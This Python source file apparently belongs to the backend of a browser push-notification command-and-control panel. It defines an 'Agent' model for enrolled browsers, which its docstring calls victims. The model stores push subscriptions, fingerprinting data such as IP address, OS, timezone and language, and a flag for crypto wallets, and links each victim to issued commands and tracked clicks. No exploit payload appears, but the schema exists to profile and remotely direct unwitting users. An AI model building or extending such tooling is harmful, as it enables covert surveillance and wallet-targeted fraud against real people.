"""
Agent model - represents an enrolled browser
"""
from datetime import datetime
from . import db


class Agent(db.Model):
    """Represents an enrolled browser (victim)"""
    __tablename__ = 'agents'
    
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(64), unique=True, nullable=False)
    push_subscription = db.Column(db.Text, nullable=False)  # FIXED: renamed from 'subscription'
    
    # Fingerprinting data
    user_agent = db.Column(db.String(512))
    ip_address = db.Column(db.String(45))
    browser = db.Column(db.String(100))
    os = db.Column(db.String(100))
    screen_resolution = db.Column(db.String(50))
    timezone = db.Column(db.String(100))
    language = db.Column(db.String(50))
    has_crypto_wallet = db.Column(db.Boolean, default=False)
    
    # Tracking
    enrolled_at = db.Column(db.DateTime, default=datetime.utcnow)  # ADDED
    first_seen = db.Column(db.DateTime, default=datetime.utcnow)
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
    is_active = db.Column(db.Boolean, default=True)
    
    # Relationships
    commands = db.relationship('Command', backref='agent', lazy=True, cascade='all, delete-orphan')
    clicks = db.relationship('Click', backref='agent', lazy=True, cascade='all, delete-orphan')
    
    def to_dict(self):
        return {
            'id': self.id,
            'agent_id': self.agent_id,
            'user_agent': self.user_agent,
            'ip_address': self.ip_address,
            'browser': self.browser,
            'os': self.os,
            'screen_resolution': self.screen_resolution,
            'timezone': self.timezone,
            'language': self.language,
            'has_crypto_wallet': self.has_crypto_wallet,
            'enrolled_at': self.enrolled_at.isoformat() if self.enrolled_at else None,
            'first_seen': self.first_seen.isoformat() if self.first_seen else None,
            'last_seen': self.last_seen.isoformat() if self.last_seen else None,
            'is_active': self.is_active,
            'command_count': len(self.commands),
            'click_count': len(self.clicks)
        }

    def get_push_subscription(self):
        """Get push subscription as dictionary"""
        if not self.push_subscription:
            return None
        
        import json
        return json.loads(self.push_subscription)
